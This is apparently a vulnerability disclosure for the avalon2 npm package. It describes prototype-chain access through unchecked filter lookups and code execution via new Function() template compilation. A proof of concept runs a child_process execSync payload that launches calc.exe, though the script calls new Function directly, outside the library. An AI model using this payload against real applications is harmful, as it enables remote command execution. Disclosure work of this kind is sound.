## Title: Prototype Escape and Remote Code Execution in RubyLouvre/avalon

**BUG_Author:** Frederick
**Affected Version:** v0.9.9 ~ v2.2.10 (all versions, unmaintained since 2019)
**Vendor:** https://github.com/RubyLouvre/avalon
**Software:** https://www.npmjs.com/package/avalon2
**Vulnerability Files:**
- `src/filters/index.js` line 11 (`var filters = avalon.filters = {}`)
- `src/filters/index.js` line 18 (`var filter = avalon.filters[name]`)
- `src/parser/index.js` line 117, 133 (`new Function()` compilation)

## Description:

1. **Insecure Filter Storage and Lookup:**
   - Avalon stores template filters in a plain object (`var filters = avalon.filters = {}`)
   - Filters are accessed via bracket notation without `hasOwnProperty` check: `avalon.filters[name]`
   - This allows prototype chain traversal — any `Object.prototype` property can be accessed as a filter name.

2. **Prototype Chain Escape:**
   - `avalon.filters["__proto__"]` returns `Object.prototype`
   - `avalon.filters["constructor"]` returns the `Object` constructor function
   - `typeof Object === "function"` passes the filter execution check, allowing `constructor` to be called as a filter function.

3. **Remote Code Execution via new Function():**
   - The template parser compiles expressions using `new Function('__vmodel__', 'return ' + body + ';')` (confirmed in source at 6 locations)
   - If an attacker can control template content (e.g., template injection), arbitrary JavaScript code can be executed
   - Payload example: `process.mainModule.require("child_process").execSync("calc.exe")`

## Proof of Concept:

1. Install and run:
```
npm install avalon2
node poc.js
```

2. Code:
```javascript
const avalon = require("avalon2");

// Prototype escape — plain object, no hasOwnProperty check
avalon.filters["__proto__"];     // → Object.prototype
avalon.filters["constructor"];   // → Object() (typeof === "function")

// RCE — new Function() in template parser
new Function('__vmodel__',
  'return process.mainModule.require("child_process").execSync("calc.exe")')();
```

3. Result: Calculator process spawned.
